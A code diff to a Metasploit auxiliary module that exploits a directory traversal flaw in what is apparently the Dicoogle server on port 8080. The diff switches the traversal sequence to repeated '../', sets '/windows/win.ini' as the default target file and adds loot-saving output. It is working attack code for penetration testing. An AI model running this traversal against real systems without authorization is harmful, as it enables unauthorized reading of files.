@@ -34,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new('FILEPATH', [true, "The path to the file to read", '\\windows\\win.ini']),
+        OptString.new('FILEPATH', [true, "The path to the file to read", '/windows/win.ini']),
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 15 ])
       ])
 
@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_host(ip)
     filename = datastore['FILEPATH']
-    traversal = "..%5d" * datastore['DEPTH'] << filename
+    traversal = "../" * datastore['DEPTH'] << filename
 
     res = send_request_cgi({
       'method' => 'GET',
@@ -57,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    vprint_good("#{res.body}")
+    vprint_good("#{peer} - #{res.body}")
     path = store_loot(
       'dicoogle.traversal',
       'text/plain',
@@ -65,5 +65,6 @@ class MetasploitModule < Msf::Auxiliary
       res.body,
       filename
     )
+    print_good("File saved in: #{path}")
   end
 end
